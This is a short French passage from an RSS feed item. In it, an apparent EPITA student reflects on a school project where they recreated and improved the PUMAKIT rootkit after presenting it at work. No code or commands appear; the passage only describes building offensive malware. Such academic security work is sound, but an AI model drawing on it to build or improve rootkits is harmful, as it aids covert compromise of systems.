+&lt;p>Il m&amp;rsquo;a permis d’expérimenter plein de sujets différents, j&amp;rsquo;ai profité de l&amp;rsquo;excuse de &amp;ldquo;c&amp;rsquo;est pour le travail d&amp;rsquo;EPITA&amp;rdquo; pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont écrits), j&amp;rsquo;ai pu mettre en pratique directement ce que j&amp;rsquo;ai pu apprendre dans mon travail, notamment j&amp;rsquo;avais dû faire une présentation sur un rootkit (PUMAKIT) à ma boîte, et j&amp;rsquo;ai pu m&amp;rsquo;en inspirer et recréer le rootkit en améliorant certaines fonctionnalités (car franchement il était assez mal foutu, les Chinois n&amp;rsquo;ont qu’à bien se tenir). J&amp;rsquo;ai eu l’occasion de discuter avec certains SRS pour avoir des avis sur certaines implémentations. Spoiler, ils étaient tous jaloux du fait que en première année d&amp;rsquo;alternance on fait un projet aussi cool alors qu&amp;rsquo;ils se tapent de l’Active Directory depuis 2 mois.&lt;/p></description></item></channel></rss>
